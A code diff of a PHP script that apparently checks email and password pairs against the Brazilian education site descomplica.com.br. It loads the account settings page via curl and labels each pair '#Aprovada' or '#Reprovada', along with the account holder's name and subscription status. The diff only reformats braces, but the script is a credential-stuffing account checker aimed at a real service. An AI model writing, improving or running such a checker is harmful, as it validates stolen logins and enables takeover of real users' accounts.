@@ -14,8 +14,7 @@ function getStr($string, $start, $end)
 
 function deletarCookies()
 {
-    if (file_exists("cookie.txt"))
-    {
+    if (file_exists("cookie.txt")) {
         unlink("cookie.txt");
     }
 }
@@ -65,23 +64,15 @@ curl_setopt($ch, CURLOPT_URL, "https://descomplica.com.br/configuracoes/");
 curl_setopt($ch, CURLOPT_POST, 0);
 $data = curl_exec($ch);
 
-if (strpos($data, 'Expira em'))
-{
+if (strpos($data, 'Expira em')) {
     $plano = "Tem plano!";
-}
-else
-{
+} else {
     $plano = "Não tem plano";
 }
 
-if (!strpos($data, 'Dados Pessoais'))
-{
+if (!strpos($data, 'Dados Pessoais')) {
     echo ' <font color="red" style="font-weight: #C0392B;">#Reprovada </font> ' . $email . ' | ' . $senha . '  <font color="#333333"></font> ';
-}
-else
-{
+} else {
     $tudo = " [Nome: $nome $sobrenome] - [Plano: $plano]";
     echo ' <font color="green" style="font-weight: bold;">#Aprovada </font> <font color="#D0D3D4"> ' . $email . ' | ' . $senha . '' . $tudo . '</font> <font color="#333333"></font>';
 }
-
-?>
